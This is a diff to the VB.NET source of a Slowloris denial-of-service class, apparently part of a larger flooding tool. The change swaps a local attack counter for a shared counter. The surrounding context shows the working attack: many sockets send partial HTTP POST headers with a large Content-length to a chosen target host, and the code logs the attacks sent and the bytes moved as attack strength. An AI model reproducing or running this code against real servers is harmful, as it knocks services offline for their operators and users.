@@ -11,7 +11,6 @@ Public Class SlowLoris
     Private ThreadstoUse As Integer
     Private Threads As Thread()
     Private AttackRunning As Boolean = False
-    Private attacks As Integer = 0
     Private RandomFile As Boolean
     Public Sub New(ByVal model As SlowLorisModel)
 
@@ -48,8 +47,7 @@ Public Class SlowLoris
             ThreadsEnded = 0
             ThreadstoUse = 0
             AttackRunning = False
-            GetFloodsBase().SetMessage("Slowloris Attack on " & HostToAttack & " finished successfully. Attacks Sent: " & attacks.ToString)
-            attacks = 0
+            GetFloodsBase().SetMessage("Slowloris Attack on " & HostToAttack & " finished successfully. Attacks Sent: " & GetFloodsBase.Get_AttackCount().ToString)
             GetFloodsBase().SetEnd()
         End If
 
@@ -64,8 +62,7 @@ Public Class SlowLoris
                 End Try
             Next
             AttackRunning = False
-            GetFloodsBase().SetMessage("Slowloris Attack on " & HostToAttack & " aborted successfully. Attacks Sent: " & attacks.ToString)
-            attacks = 0
+            GetFloodsBase().SetMessage("Slowloris Attack on " & HostToAttack & " aborted successfully. Attacks Sent: " & GetFloodsBase.Get_AttackCount().ToString)
 
         Else
             GetFloodsBase().SetMessage("No Slowloris Attack is Running!")
@@ -101,8 +98,8 @@ Public Class SlowLoris
                         Dim HttpString = "POST /" & file & " HTTP/1.1" & ChrW(13) & ChrW(10) & "Host: " & HostToAttack.ToString() & ChrW(13) & ChrW(10) & "Content-length: 5235" & ChrW(13) & ChrW(10) & ChrW(13) & ChrW(10)
                         socketArray(i).Send(ASCIIEncoding.Default.GetBytes(HttpString), SocketFlags.None)
 
-                        attacks = attacks + 1
-                        GetFloodsBase().Set_AttackUpStrengOnByte(attacks * HttpString.Length)
+                        GetFloodsBase().Set_AttackCount(GetFloodsBase.Get_AttackCount() + 1)
+                        GetFloodsBase().Set_AttackUpStrengOnByte(GetFloodsBase.Get_AttackCount() * HttpString.Length)
 
                     Next i
                     Dim j As Integer
@@ -116,7 +113,7 @@ Public Class SlowLoris
                             sb.Append(Encoding.ASCII.GetString(bytesReceived, 0, bytes))
                         Loop Until bytes > 0
 
-                        GetFloodsBase().Set_AttackDownStrengOnByte(attacks * sb.ToString().Length)
+                        GetFloodsBase().Set_AttackDownStrengOnByte(GetFloodsBase.Get_AttackCount() * sb.ToString().Length)
                         socketArray(j).Close()
                     Next j
                     Continue Do
